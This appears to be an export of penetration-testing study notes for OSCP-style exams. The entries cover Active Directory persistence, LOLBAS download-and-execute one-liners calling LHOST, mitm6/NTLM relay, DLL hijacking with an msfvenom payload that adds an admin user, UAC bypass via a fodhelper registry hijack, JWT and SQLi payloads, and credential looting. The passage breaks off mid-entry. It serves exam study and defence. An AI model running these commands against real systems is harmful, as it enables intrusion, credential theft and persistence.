Fusion 13 or newer. Allow the VMware system extension in Privacy & Security and restart, or the
USB menu stays empty.

## Hand the adapter to Kali
VM running, Alfa plugged into the data adapter. In the menu bar:
**Virtual Machine -> USB & Bluetooth -> the Alfa -> Connect**.
macOS drops the device. It now belongs to the VM. If no popup appeared, use that same menu.
Inside Kali the Alfa is a new interface, often **wlan1**. **wlan0** is usually the virtual NIC.
    lsusb
    ip link
Do not run airmon-ng on the virtual NIC. That drops the VM's network and never touches the Alfa.
If the VM freezes when the stick is plugged in, shut down, set the VM USB controller to **USB 2.0**,
and start again. Parallels uses **Devices -> USB & Bluetooth** the same way. VirtualBox USB
passthrough on Apple Silicon is not the setup to use.

## Confirm monitor mode
Use the interface that appeared with the stick.
    sudo airmon-ng check kill
    sudo airmon-ng start wlan1
    sudo aireplay-ng --test wlan1mon
`Injection is working` means the chain is good.

## Virtual NIC, separate from the stick
- **NAT** — the VM shares the Mac's connection. Leave this on.
- **Bridged** — the VM gets its own LAN address.
- **Host-only** — Mac and VM only.
None of these three is monitor mode.

## Pattern
"USB-C to a data adapter, Alfa into that, Fusion USB menu into Kali. NAT stays the wired NIC."
Start with an AWUS036ACM. Confirm lsusb, then airmon-ng on the new wlan, then the injection test.

entries.title: AD persistence: golden/silver tickets, DCSync
entries.brief: How attackers keep domain access after compromise (and what they abuse)
entries.body:
## The idea
Once you reach high privilege in AD, persistence means keeping access even after passwords change.
These techniques abuse Kerberos trust and replication. (Know them for the exam and for detection;
use only where authorised.)

## The big ones
- **DCSync** — with replication rights (Domain Admin, or a delegated ACL), ask a DC to 'replicate'
  and hand over **any** account's hash, including **krbtgt** — no code on the DC.
    impacket-secretsdump -just-dc DOMAIN/da:pass@DC
- **Golden Ticket** — with the **krbtgt** hash you forge a TGT for any user (incl. Domain Admin),
  valid until krbtgt is rotated **twice**. Total, lasting domain control.
    impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain corp.local Administrator
- **Silver Ticket** — with a **service account's** hash, forge a TGS for just that service (stealthier,
  no DC contact).
- **AdminSDHolder / ACL backdoors** — plant rights on protected groups that re-apply via SDProp.
- **Skeleton Key / DSRM / computer-account** tricks — other footholds.

## Detection angle (why defenders care)
Golden tickets show anomalous ticket lifetimes/encryption; DCSync shows replication from a non-DC.
Rotating krbtgt twice invalidates golden tickets.

## Pattern
"Get krbtgt (via DCSync) -> forge tickets at will (golden)." Service hash -> silver ticket for that
service. These are post-DA persistence; the real defence is protecting replication rights and
rotating krbtgt. (See: active-directory-basics, pass-the-hash-ticket.)

entries.title: Living off the land (LOLBAS / GTFOBins mindset)
entries.brief: Using trusted built-in binaries so there's nothing foreign to flag
entries.body:
## The idea
Bringing your own tools gets caught (AV, app allow-lists). **Living off the land** uses binaries
**already present and trusted** on the system to download, execute, or persist — no foreign exe to
detect. Linux has GTFOBins; Windows has **LOLBAS**.

## Why it beats dropping tools
AppLocker/WDAC trust these signed system binaries; AV has no 'malware' file to match; and they're
everywhere. You're abusing legitimate functionality, not planting code.

## Windows LOLBAS examples
- **Download**: `certutil -urlcache -f http://LHOST/x x`; `bitsadmin /transfer j http://LHOST/x x`;
  `curl` (modern Windows).
- **Execute**: `mshta http://LHOST/x.hta`; `regsvr32 /s /u /i:http://LHOST/x.sct scrobj.dll`;
  `rundll32`; `msbuild evil.xml`; `installutil`.
- **Recon**: `wmic`, `net`, `nltest`, `reg query`.
Catalogue: lolbas-project.github.io.

## Linux equivalent
GTFOBins is the same idea for Unix binaries (break out, read/write, escalate). `oscp gtfo <bin>`.

## Pattern
"What trusted binary already here can do what I need (download/exec/persist)?" Prefer it over a
dropped tool to dodge AV and allow-lists. LOLBAS (Windows) / GTFOBins (Linux) are the catalogues;
this is the backbone of evasion (av-evasion-basics).

entries.title: Enumeration automation (use it, then read it)
entries.brief: The scripts that speed recon/privesc — and the discipline to not trust them blindly
entries.body:
## The tools, by stage
Automation saves typing, not thinking. Run these, then **read** the output and verify.
- **Network/service recon**: AutoRecon, nmapAutomator — orchestrate nmap + follow-up scans and
  save everything per target.
      autorecon TARGET          # full staged scan into ./results/
- **Linux privesc**: linpeas.sh (the big one), LinEnum, linux-smart-enumeration (lse.sh),
  linux-exploit-suggester.
      ./linpeas.sh -a | tee linpeas.out        # then read the red/yellow (peass-reading)
- **Windows privesc**: winPEAS, PowerUp (`Invoke-AllChecks`), Seatbelt, PrivescCheck.
- **AD**: BloodHound (bloodhound-python collector), PingCastle (posture).
- **Web**: whatweb/nikto/nuclei + a content scanner (feroxbuster/ffuf).

## The discipline
- Automation **finds leads**; you confirm and exploit them manually.
- Save output (`tee`, `-oA`, `-o`) for your report and for searching later.
- On exams, know the manual checks (linux-enum-checklist / smb-enumeration-checklist) because a
  tool may be blocked, flagged, or simply wrong.

## Pattern
"Automate the breadth, verify the depth." Fire AutoRecon + PEAS to surface everything fast, then
read the highlights and prove each one by hand. Never paste a tool's 'you can get root' line into a
report without reproducing it (note-taking-reporting).

entries.title: FTP enumeration (21)
entries.brief: Anonymous access, what to grab, and when FTP leads to a shell
entries.body:
## First moves
    nc -nv TARGET 21                 # read the banner (software + version -> searchsploit)
    ftp TARGET                        # login:  user 'anonymous', password anything
Anonymous FTP is common; even read-only it leaks files, usernames and software.

## Inside the session
    ls -la ; cd ..                    # browse; try to escape the start dir
    binary                            # ALWAYS set binary mode before get/put (avoids corruption)
    get config.php ; mget *           # download
    put shell.php                     # upload — the interesting bit

## When FTP becomes RCE
- **Writable FTP rooted in a web directory**: `put shell.php`, then browse to it over HTTP ->
  webshell. (Confirm the FTP root maps to the webroot.)
- **Writable + known path**: drop an SSH key into a home's ~/.ssh if FTP has that reach.
- **Version exploits**: vsftpd 2.3.4 backdoor, ProFTPD mod_copy (CVE-2015-3306) -> searchsploit.

## Scripted grab
    wget -r ftp://anonymous:anonymous@TARGET/    # mirror everything readable

## Pattern
"Anonymous or creds? Read-only or writable, and does the FTP root touch the webroot/a home?"
Banner -> searchsploit; mirror readable files for creds; a writable FTP mapped to the webroot (or
~/.ssh) turns into a shell. Set binary mode before transfers.

entries.title: RDP (3389) — access and attacks
entries.brief: Reaching Windows desktops with creds/hashes, and the notable RDP CVEs
entries.body:
## Connect (creds, or a hash)
    xfreerdp /u:bob /p:'P@ss' /v:TARGET /cert:ignore /dynamic-resolution
    xfreerdp /u:Administrator /pth:<NThash> /v:TARGET          # pass-the-hash (Restricted Admin)
    rdesktop -u bob -p 'P@ss' TARGET                           # older client
Add `/drive:loot,/tmp` to move files in/out via \\tsclient.

## Get the creds first
RDP rarely falls to brute force (lockouts), but reuse works: creds from dumps, SAM/secretsdump,
GPP, or spraying. `nxc rdp TARGET -u users -p pass` validates access quickly.

## Notable CVEs (version-dependent)
- **BlueKeep (CVE-2019-0708)** — pre-auth RCE on old Windows (7/2008 R2). Powerful but can crash
  the host; use with care and only when authorised.
- **CredSSP / NLA** downgrade and relay scenarios.

## Session hijack (post-compromise)
As SYSTEM you can hijack an existing RDP session without the password (`tscon`), or dump
cleartext from memory (mimikatz).

## Pattern
"Do I have creds/a hash for an RDP-enabled account?" Connect with xfreerdp (/pth for hashes), use
/drive for transfer. Brute force is for lockout pain; prefer reuse. BlueKeep only on matching old
versions and with caution.

entries.title: IPv6 attacks (mitm6) + relay
entries.brief: Why default IPv6 lets you become the DNS server and relay to AD
entries.body:
## The default-config flaw
Windows prefers IPv6 and, out of the box, constantly asks for an IPv6 address via DHCPv6. Usually
nothing answers. **mitm6** answers — becoming the victim's IPv6 **DNS server**. Now you resolve
names for them, and you relay the authentication that follows.

## The classic chain (mitm6 + ntlmrelayx)
    # 1) poison DHCPv6 / become DNS for the domain:
    sudo mitm6 -d corp.local
    # 2) relay the resulting auth to LDAP(S) on the DC:
    impacket-ntlmrelayx -6 -t ldaps://DC -wh fakewpad.corp.local --delegate-access
When a victim (especially a machine account or admin) authenticates, ntlmrelayx relays it to
LDAP and sets up **resource-based constrained delegation** (RBCD) or creates a user -> you can
then impersonate a privileged account on the victim.

## Why it's so effective
It needs no credentials to start — just being on the segment — and exploits a *default* Windows
behaviour, not a patchable bug. It pairs with the WPAD name (`-wh`) to also capture proxy auth.

## Defence (what you're exploiting)
Disable IPv6 if unused, require LDAP signing/channel binding, and enforce SMB signing — the same
controls that stop coercion-ntlm-relay.

## Pattern
"Is IPv6 unmanaged on the segment?" Run mitm6 to own DNS, relay the auth to LDAP with ntlmrelayx
(--delegate-access for RBCD). A credential-free path from a foothold toward Domain Admin on many
default AD networks. (See: coercion-ntlm-relay, active-directory-trusts.)

entries.title: Windows DLL hijacking / search-order abuse
entries.brief: Making a privileged program load YOUR DLL by exploiting its search path
entries.body:
## The idea (the Windows cousin of library-hijacking)
When a program loads a DLL **by name** (not a full path), Windows searches a defined order of
directories. If you can write a DLL named what it wants into a directory searched **before** the
real one, the privileged process loads your code.

## The search order (simplified, SafeDllSearchMode on)
1. the application's own directory  2. System32/System  3. Windows dir  4. current dir  5. PATH.
A **missing** DLL, or a writable directory earlier in the order, is the opening.

## Find candidates
- **Missing DLLs**: run the target under Procmon and filter `NAME NOT FOUND` + `.dll` -> a DLL it
  looks for but doesn't find; if a writable search path exists, drop it there.
- **Writable app dir / writable PATH entry** that a SYSTEM service's exe sits in or searches.
    # list writable dirs on PATH:
    (for %d in ("%path:;=";"%") do @icacls %d) 2>nul | findstr /i "Everyone BUILTIN\Users"

## Build and plant
    msfvenom -p windows/x64/exec CMD='cmd /c net user hx P@ss /add' -f dll -o hijack.dll
    # name it exactly what the target loads, place it in the writable search dir, trigger (restart svc/app)

## Pattern
"Does a privileged program load a DLL by name from a path I can write?" Missing DLL + writable
search dir, or a writable app directory, = your DLL runs with its privilege. Procmon finds the
candidates; an auto-start service makes it persistent. (See: windows-service-privesc.)

entries.title: Binary mitigations: NX, ASLR, PIE, canary, RELRO
entries.brief: What checksec tells you and how each protection shapes the exploit
entries.body:
## Read the defences first
Before exploiting a binary, check which protections are on — they decide your whole approach.
    checksec --file=./vuln        # (pwntools/GEF/pwndbg)  shows all of the below

| Protection | What it does | Your workaround |
| --- | --- | --- |
| NX / DEP | stack/heap non-executable | reuse code: ret2libc / ROP (no stack shellcode) |
| ASLR | libs/stack/heap at random addresses | leak an address at runtime, then compute bases |
| PIE | the binary itself is randomized too | leak a binary address (or defeat with a non-PIE gadget) |
| Stack canary | guard value detects stack smashes before return | leak the canary, or avoid overwriting it (format-string/partial) |
| RELRO (Full) | GOT is read-only | can't overwrite GOT entries; target other hooks/returns |
| Fortify (_FORTIFY_SOURCE) | safer libc wrappers | fewer trivial overflows |

## The logic
Each mitigation removes one shortcut, so modern exploitation is a chain: **leak** (beat ASLR/PIE
/canary) -> **build a ROP chain** (beat NX) -> **redirect** execution (to system/execve). No single
'jump to shellcode' like the OSCP 32-bit NX-off case (buffer-overflow-basics).

## Pattern
"checksec -> which shortcuts are gone?" NX -> ROP/ret2libc; ASLR/PIE -> need a leak; canary ->
leak/avoid it; Full RELRO -> no GOT overwrite. Enumerate the protections, then assemble the
leak-then-ROP chain they force. (See: bof-64-and-rop.)

entries.title: Format-string vulnerabilities
entries.brief: Why printf(user_input) leaks memory and can write anywhere
entries.body:
## The root cause
A format function is called with **user input as the format string** itself:
    printf(user_input);          // VULNERABLE
    printf("%s", user_input);    // safe
Format specifiers (`%x`, `%s`, `%n`) then act on the stack/args the program never intended to
pass — turning a print into an arbitrary read and even write.

## What the specifiers give you
- **%x / %p** — leak stack words (dump memory; find canaries, saved addresses -> beat ASLR).
- **%s** — dereference a stack value as a pointer and print the string there (read arbitrary
  memory if you control the pointer).
- **%n** — **writes** the number of bytes printed so far to an address taken from the args. Control
  the address (place it on the stack) + the count (via field width) = **write-what-where**.

## Detect it
Send `%x %x %x %x` (or `%p`) in an input that gets printed; if you see hex values (stack leak)
instead of the literal text, it's a format-string bug. `AAAA.%p.%p.%p...` helps locate your input
on the stack (the offset).

## Exploit it
Leak to defeat ASLR/canary, then use `%n` to overwrite a GOT entry / return address / function
pointer, redirecting execution (often to system). pwntools' `fmtstr_payload` automates the write.

## Pattern
"Is my input used AS the format string?" `%p` leaks (read), `%n` writes (write-what-where).
Leak first (beat protections), then write to hijack control flow. The fix you bypass is always
using a constant format string.

entries.title: Kerberos tickets: kirbi, ccache and conversion
entries.brief: The two ticket formats, where each lives, and how to move between them
entries.body:
## Two formats, two worlds
- **.kirbi** — the Windows/Rubeus/mimikatz format (base64 blobs you `kerberos::ptt`).
- **ccache** — the Linux/MIT/Impacket format, pointed to by the **KRB5CCNAME** env var.
You'll capture a ticket in one world and need it in the other, so conversion matters.

## Using a ccache (Linux / Impacket)
    export KRB5CCNAME=/path/ticket.ccache
    impacket-psexec -k -no-pass DOMAIN/user@TARGET.corp.local    # -k uses the ccache
    klist                                                         # inspect current tickets
Tools like getTGT/getST write .ccache directly:
    impacket-getTGT -hashes :<NThash> corp.local/user   # -> user.ccache

## Using a kirbi (Windows / mimikatz / Rubeus)
    mimikatz # kerberos::ptt ticket.kirbi
    Rubeus.exe ptt /ticket:ticket.kirbi

## Convert between them
    impacket-ticketConverter ticket.kirbi ticket.ccache   # kirbi -> ccache
    impacket-ticketConverter ticket.ccache ticket.kirbi   # ccache -> kirbi
(The 0xsyr0 notes list these as 'kirbi to ccache' / 'ccache to kirbi' — see `oscp notes`.)

## Gotchas
- Use the **FQDN** and correct case for the target; Kerberos is name- and clock-sensitive.
- Fix clock skew: `sudo ntpdate DC` / `rdate` — tickets fail if time drifts >5 min.

## Pattern
"Which format do I have, and which does my tool want?" ccache for Impacket (KRB5CCNAME + -k),
kirbi for mimikatz/Rubeus (ptt); `ticketConverter` bridges them. Mind the FQDN and clock skew.

entries.title: Web auth & access-control bypass tricks
entries.brief: A grab-bag of ways logins and restrictions fall over
entries.body:
## Logins
- **Default / weak creds**: admin:admin, product defaults (check docs), common pairs — try first.
- **SQLi auth bypass**: `' OR '1'='1` versus `' OR '1'='2`, and `admin'-- -`, in the
  username and again in the password. Different results mean the login query is injectable.
  The full probe list is sqli-logic. NoSQL `{"$ne":null}` is nosql-injection.
- **Response/logic flaws**: register an existing-but-privileged username, password reset that
  leaks or accepts a predictable token, 2FA you can skip by going straight to the post-login URL.
- **JWT/cookie tampering**: forge claims/role (cookies-sessions-jwt).

## 403 / restricted-path bypass
The server says 'forbidden' — try to reach it another way:
    /admin -> /admin/  /admin/.  /admin%2f  /ADMIN  /./admin  /admin..;/
    # verb tampering: GET blocked but POST/HEAD/PUT allowed?
    curl -X POST http://TARGET/admin
    # header spoofing (trusted-proxy checks):
    curl http://TARGET/admin -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin' \
      -H 'X-Forwarded-Host: localhost'

## Rate-limit / lockout bypass
Rotate `X-Forwarded-For`, vary casing, or spray (one password, many users) instead of brute.

## Pattern
"Is the control checking the right thing, consistently?" Logins fall to defaults/injection/logic;
restricted paths fall to path/verb/header variations; limits fall to source-IP spoofing or
spraying. Try the cheap variations before assuming a hard wall.

entries.title: PrintNightmare & the print spooler
entries.brief: Why the Windows spooler became local & remote SYSTEM
entries.body:
## The component
The **Print Spooler** service runs as SYSTEM and is enabled by default on most Windows, including
domain controllers. A series of bugs in how it loads printer drivers made it a reliable path to
code execution.

## PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
A low-priv (or remote authenticated) user could make the spooler load a **malicious printer
driver DLL** -> code execution as SYSTEM. Two flavours:
- **Local privesc**: point the spooler at a local malicious DLL -> SYSTEM.
- **Remote (RCE)**: deliver the DLL from an SMB share you control -> SYSTEM on the target/DC.
    # public PoCs (CVE-2021-1675) take a UNC path to your DLL:
    # SharpPrintNightmare / CVE-2021-1675.ps1 '\\LHOST\share\evil.dll'

## The coercion cousin (PrinterBug / SpoolSample)
The spooler's RPC can be abused to **coerce** a machine (incl. a DC) to authenticate to you — fed
into NTLM relay (see coercion-ntlm-relay). Different bug, same service.

## Check & scope
    # is the spooler running?
    sc query spooler        (Windows)   /   nxc smb TARGET -M spooler   (from Kali)
Patched/disabled spoolers block it; many environments disable the spooler on DCs because of this.

## Pattern
"Is the Print Spooler running and unpatched?" PrintNightmare -> SYSTEM (local or remote via a DLL
on your SMB share); the spooler RPC also coerces auth for relaying. High-impact and default-on —
check it early on Windows/DCs.

entries.title: Exchange: ProxyLogon & ProxyShell
entries.brief: Why on-prem Exchange chains became unauthenticated RCE
entries.body:
## The target
On-premises Microsoft Exchange sits at the network edge and runs with high privilege. Two famous
2021 exploit chains turned it into unauthenticated RCE — worth recognising when you see an OWA/
Exchange front end.

## ProxyLogon (CVE-2021-26855 + 27065)
An SSRF in Exchange (26855) lets you authenticate as the server, chained with a file-write
(27065) to drop a webshell -> RCE as SYSTEM/Exchange. Pre-auth.

## ProxyShell (CVE-2021-34473 / 34523 / 31207)
A three-bug chain (URL ACL bypass -> elevation -> arbitrary file write via a mailbox export) ->
pre-auth webshell. Public exploits target the Autodiscover/PowerShell backend.

## Recognise & test
    # fingerprint Exchange + version from OWA:
    curl -sk https://TARGET/owa/ -I ; curl -sk https://TARGET/ecp/
    nuclei -u https://TARGET -tags exchange,proxyshell
Match the exact build number to the right CVE (searchsploit / public PoCs); these are
version-specific.

## Pattern
"Is this on-prem Exchange, and at what patch level?" Pre-auth chains (ProxyLogon/ProxyShell)
drop a webshell as a privileged account -> often a fast domain foothold. Fingerprint the version,
then match the chain. (Cloud/Exchange Online is not affected.)

entries.title: UAC bypasses
entries.brief: Going from a medium-integrity admin to a full elevated token
entries.body:
## What UAC actually gates
When an **administrator** logs in, UAC splits their token: processes run with a **filtered**
(medium-integrity) token until explicitly elevated. UAC bypass = get a **high-integrity** process
without a consent prompt. (It is admin -> elevated, NOT standard-user -> admin.)

## Check where you stand
    whoami /groups | findstr /i "Label"     # Medium vs High Mandatory Level
    net localgroup administrators           # am I an admin at all?
If you're already High, you don't need a bypass; if you're a standard user, this isn't your path
(use a real privesc instead).

## The techniques (auto-elevating binary abuse)
Trusted Windows binaries auto-elevate without a prompt; make them run your code:
- **fodhelper** / **computerdefaults** — hijack a registry key they read:
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f
    fodhelper.exe        # -> high-integrity cmd
- **eventvwr** (mscfile), **sdclt**, **DiskCleanup** — similar registry-hijack variants.
UACME catalogues dozens; winPEAS/PowerUp flag the quick wins.

## Pattern
"Am I an admin stuck at medium integrity?" Abuse an auto-elevating binary (fodhelper et al.) via a
user-writable registry key to get a high-integrity shell. If you're not an admin, skip this — it's
the last step of becoming SYSTEM, not the first.

entries.title: Thick-client & .NET app testing
entries.brief: How to attack desktop apps that talk to a backend
entries.body:
## What a thick client is
A desktop application (often .NET/Java/C++) with logic on the client and a network/DB backend.
You attack it on three fronts: the **traffic** it sends, the **binary** itself, and the **local**
artifacts it leaves.

## 1) Intercept its traffic
- HTTP(S): point it at Burp (system proxy / force proxy); import Burp's CA. Now test the API like
  any web app (http-fundamentals, the injection logics).
- Non-HTTP/TCP: use a TCP intercept proxy (Burp's invisible/ custom, or mitmproxy/ Echo Mirage).
Hardcoded creds/keys and trust-everything logic are common.

## 2) Decompile / inspect the binary
- **.NET**: dnSpy / ILSpy decompile to near-source — read logic, find secrets, even patch and
  re-save (bypass a license/auth check live).
- **Java**: jd-gui / procyon on the JAR.
Hunt connection strings, API keys, and client-side checks you can disable.

## 3) Local artifacts
Config files, registry, local DBs (SQLite), and memory (strings/ the heap) often hold creds and
endpoints. `strings` the binary; check %APPDATA%/install dir.

## Pattern
"Intercept the traffic, decompile the client, and loot its local files." The client is attacker-
controlled, so any secret or check inside it is yours to read/bypass; the real security must be
server-side (web-source-review applies to the backend).

entries.title: Exposed Docker registry (5000)
entries.brief: Why an open registry hands you images full of source and secrets
entries.body:
## The setup
A Docker **registry** (default port 5000) stores container images. If it's exposed without auth,
you can list repositories and **pull images** — which contain application source, config, and
frequently hardcoded credentials and keys.

## Enumerate via the HTTP API
    curl -s http://TARGET:5000/v2/_catalog                     # list repositories
    curl -s http://TARGET:5000/v2/<repo>/tags/list             # tags for a repo
    curl -s http://TARGET:5000/v2/<repo>/manifests/<tag>       # image manifest / layers

## Pull and mine
    docker pull TARGET:5000/<repo>:<tag>                        # if you can reach the daemon
    # or pull/extract layers manually and inspect them:
    docker save TARGET:5000/<repo>:<tag> -o img.tar; tar xf img.tar
    # then grep the layers:
    grep -rniE 'password|secret|api[_-]?key|token' extracted/
Image **history** can also leak build-time secrets:
    docker history --no-trunc TARGET:5000/<repo>:<tag>

## Pattern
"Is a registry open on 5000?" List the catalog, pull images, and treat each like a dumped
codebase — grep layers and history for creds/keys. Same 'images are source + secrets' idea as an
exposed .git (git-exposure).

entries.title: Advanced JWT attacks (alg, kid, jku)
entries.brief: Beyond the basics: header-driven key confusion and injection
entries.body:
## Recap the model
A JWT is `header.payload.signature`; the **header** tells the server how to verify it. Trusting
attacker-controlled header fields is the root of most JWT attacks. (Basics: cookies-sessions-jwt.)

## The attack surface in the header
- **alg: none** — if accepted, drop the signature and forge any claims.
- **alg confusion (RS256 -> HS256)** — the server verifies RS256 with a public key; trick it into
  HS256 and **sign with the public key as the HMAC secret** (you have the public key). Tool:
  `jwt_tool -X k -pk public.pem`.
- **weak HS256 secret** — crack it offline: `hashcat -m 16500 jwt.txt rockyou.txt`, then re-sign.
- **kid injection** — the `kid` (key id) often selects a key by path/DB lookup:
    "kid": "../../dev/null"      # force an empty/known key -> sign with it
    "kid": "key' UNION SELECT 'secret"   # SQLi in the kid -> return a key you control
- **jku / x5u** — the header points to a URL for the verification key; if the server fetches it
  unvalidated, host your own key and sign with its private half.

## Tooling
    jwt_tool <token>            # inspect + run the above attacks (-M for a scan)
Always re-check claims after forging (exp, role/isAdmin, sub).

## Pattern
"Does the server trust a header field (alg/kid/jku) I control?" none -> no sig; RS256->HS256 ->
sign with the public key; kid -> point at a key you know or inject; jku/x5u -> host your key.
The fix you bypass is pinning the algorithm and not trusting header-supplied keys.

entries.title: Command-and-control (C2) frameworks
entries.brief: What a C2 is, the pieces, and where it fits (OSEP/red team)
entries.body:
## What a C2 is
A **Command-and-Control** framework manages compromised hosts at scale: an **implant/beacon** runs
on the target and calls back to a **team server**; an **operator** console tasks it. It's the
grown-up version of a reverse shell — sessions, tasking, pivoting, and evasion built in.

## The pieces
- **Listener** — where beacons connect (HTTP/HTTPS/DNS/SMB named-pipe; malleable profiles to blend
  in).
- **Beacon/implant** — the agent; **sleeps** and checks in periodically (jitter) to look normal.
- **Stager vs stageless** — a tiny loader that pulls the full payload, vs the whole implant at once.
- **Post-ex & pivoting** — run tools in-memory, SOCKS proxy through a beacon, link SMB beacons for
  internal hosts.

## The common frameworks
- **Cobalt Strike** (commercial, the industry standard), **Sliver** (Go, open-source), **Havoc**,
  **Mythic**, **PowerShell Empire / Metasploit** (also a basic C2).

## Scope
C2 is **OSEP/red-team** territory, not OSCP (which uses plain reverse shells and the one-MSF-box
rule). Understand the concept; only deploy against authorised scopes.

## Pattern
"Beacon calls home to a listener; operator tasks it; it sleeps to evade and pivots to reach more
hosts." It layers sessions, evasion and pivoting over the basic callback. For OSCP stick to
reverse shells (reverse-and-bind-shells); know C2 for the harder exams.

entries.title: Looting browser & vault credentials
entries.brief: Where saved passwords live and how they're recovered post-compromise
entries.body:
## The high-value stores
After a foothold, saved credentials in browsers and managers are gold — users reuse them
everywhere.

## Browsers
- **Chrome/Edge (Windows)**: passwords in a SQLite DB (`Login Data`), encrypted with **DPAPI**
  tied to the user. Decrypt in that user's context (SharpChrome, or a DPAPI tool). Cookies too
  (session hijacking without the password).
- **Firefox**: `logins.json` + `key4.db` in the profile; decrypt offline with
  `firefox_decrypt.py` (no DPAPI — portable).

## Password managers
- **KeePass (.kdbx)** — crack the master password offline:
    keepass2john Database.kdbx > h ; john h --wordlist=rockyou.txt
  (KeePass also had a memory-dump master-password leak, CVE-2023-32784.)
- Look for **.kdbx**, `*.psafe3`, and browser-extension vault files across home dirs.

## Windows credential stores
- **Credential Manager / DPAPI** blobs, **Windows Vault**, saved RDP/VNC creds.
- **LSASS** memory -> plaintext/NTLM via mimikatz/pypykatz (needs admin) — see mimikatz.

## Pattern
"Where does this user save passwords?" Browser DBs (DPAPI on Windows, key4.db on Firefox), KeePass
`.kdbx` (crack the master), and Windows Vault/LSASS. Recover them in the right context, then reuse
everywhere (creds-hunting, password-cracking-workflow).

entries.title: The SUID bit (+s) — run as the owner, not as you
entries.brief: Why a SUID binary grants the owner's privileges, and how to find every one in one go
entries.body:
## Normal execution vs SUID
Normally a command runs with **your** permissions. Logged in as `bhuppi`, a command you run can
only touch what `bhuppi` is allowed to touch.

When a binary has the **SUID bit (+s)** set:
- The program **always runs with the permissions of the file's owner**, no matter which standard
  user runs it.
- The owner of `/usr/bin/ls` is **root**.
- So if `+s` were applied to it, any regular user who runs `ls` would temporarily inherit full
  **root-level** privileges — for the exact duration of that command.

That is the whole mechanism, and the engine behind much of Linux privilege escalation.

## See it and set it
    ls -l /usr/bin/passwd         # -rwsr-xr-x  -> the 's' in the owner's execute slot = SUID
    chmod u+s /usr/bin/foo        # set SUID (as root)
    chmod u-s /usr/bin/foo        # remove it
The `s` sits where the owner's `x` would be. A lowercase `s` = SUID + executable; a capital `S` =
SUID set but execute bit off. **SGID** is the same idea for the group (`chmod g+s` -> runs as the
owning group). See the full model in `oscp manual show permissions-model`.

## Find every SUID binary in ONE go
    find / -perm -4000 -type f 2>/dev/null
Read it: `-perm -4000` = the SUID bit is set (4000 octal); `-type f` = regular files;
`2>/dev/null` discards the permission-denied noise from walking all of `/`. Useful variants:

    find / -perm -u=s -type f 2>/dev/null                      # same, symbolic form
    find / -perm -4000 -o -perm -2000 -type f 2>/dev/null      # SUID (4000) OR SGID (2000)
    find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null   # list with owner/size

## Why it's the #1 privilege-escalation check
A **SUID-root** binary that can spawn a shell, run a command, or read/write files hands you root.
After listing them, compare to the standard set — an *unusual* SUID binary (a custom tool, a
shell, `vim`, `find`, `nmap`...) is a direct privesc lead. Get the exact escape locally:
    oscp gtfo <binary> suid

## Pattern
"Does this binary run as its owner (SUID), and is that owner root?" Enumerate them all with
`find / -perm -4000 -type f 2>/dev/null`, flag anything non-standard, and turn it into root with
`oscp gtfo <binary>`. (See also: gtfobins-logic, permissions-model.)

entries.title: NFS enumeration (2049)
entries.brief: Listing exports, mounting, and the UID trick that reads other users' files
entries.body:
## Enumerate the exports
    rpcinfo -p TARGET                      # is NFS/mountd running?
    showmount -e TARGET                    # list exported shares + allowed clients
    nmap --script nfs-ls,nfs-showmount,nfs-statfs -p111,2049 TARGET

## Mount and browse
    mkdir /mnt/nfs
    sudo mount -o rw,vers=3 TARGET:/export /mnt/nfs      # try vers=3 if the default fails
    ls -la /mnt/nfs

## The UID trick (read files you 'shouldn't')
NFS (v3) trusts the **UID number** the client sends, not a real identity. If an exported file is
owned by UID 1005 and you can't read it, **create a local user with UID 1005** (or `sudo` as that
UID) and the server lets you read it:
    sudo useradd -u 1005 victim ; sudo -u victim cat /mnt/nfs/secret
Files owned by root need the no_root_squash export to write as root (see nfs-no-root-squash).

## What to hunt
SSH keys and configs in mounted homes, backups, web roots, and **writable** exports (plant a
payload). Combine readable creds with reuse.

## Pattern
"What's exported, can I mount it, and can I impersonate the file owner's UID?" showmount -> mount
-> match UIDs to read, or exploit no_root_squash to write a SUID root binary. NFS trusts numbers,
so numbers are what you forge.

entries.title: rsync enumeration (873)
entries.brief: Listing anonymous modules and pulling (or pushing) files
entries.body:
## The service
rsync can run as a daemon on port 873, exposing named **modules** (like shares). Anonymous access
is common and often read/write — a quiet way to read or plant files.

## Enumerate
    nc -nv TARGET 873                      # banner
    rsync --list-only rsync://TARGET/       # list available modules
    rsync --list-only rsync://TARGET/<module>/   # list a module's contents

## Pull and push
    rsync -av rsync://TARGET/<module>/ ./loot/            # download everything
    rsync -av ./shell rsync://TARGET/<module>/            # upload (if writable)
With credentials:
    rsync -av rsync://user@TARGET/<module>/ ./loot/       # prompts for the password

## When it becomes a shell
- A **writable** module mapped to a web root -> push a webshell.
- A module mapped to a home -> push an SSH key into ~/.ssh/authorized_keys.
- A module running as root with writable system paths -> plant a cron/SUID payload.

## Pattern
"What modules are exposed, and are they writable?" `--list-only` to enumerate, `-av` to pull creds/
source or push a payload where rsync can write. Check what each module maps to on disk — that
decides read-loot vs write-to-shell.

entries.title: Legacy services: telnet, finger, rlogin, rsh
entries.brief: Old cleartext services that still hand out access and info
entries.body:
## Why they matter
Old boxes (and some appliances) still run plaintext/trusting services. They leak info, pass creds
in the clear, and sometimes trust the client blindly.

## finger (79) — user enumeration & info
    finger @TARGET ; finger root@TARGET          # who exists / is logged in
    # finger-user-enum.pl against a user list confirms accounts (feeds spraying)

## telnet (23) — cleartext remote shell
    telnet TARGET                                # banner + login (creds sent in cleartext)
    # sniff a telnet session (tcpdump -A) to grab creds; default/weak creds common on appliances

## rlogin / rsh / rexec (512-514) — the 'r-services'
Trust-based: a permissive `~/.rhosts` or `/etc/hosts.equiv` lets a remote user log in **without a
password** from a 'trusted' host/user.
    rlogin -l root TARGET                         # try as root
    # writable ~/.rhosts (via another bug) -> add '+ +' -> passwordless login as that user

## Pattern
"Is an old, trusting service exposed?" finger -> usernames; telnet -> cleartext creds (banner,
defaults, or sniffing); r-services -> abuse .rhosts/hosts.equiv trust for passwordless login.
Always read the banner (version -> searchsploit).

entries.title: CMS exploitation (WordPress, Drupal, Joomla)
entries.brief: Why content-management systems fall to plugins, themes and known CVEs
entries.body:
## The pattern across all CMS
A CMS is a core app plus many **third-party plugins/themes** and an admin panel. The core is
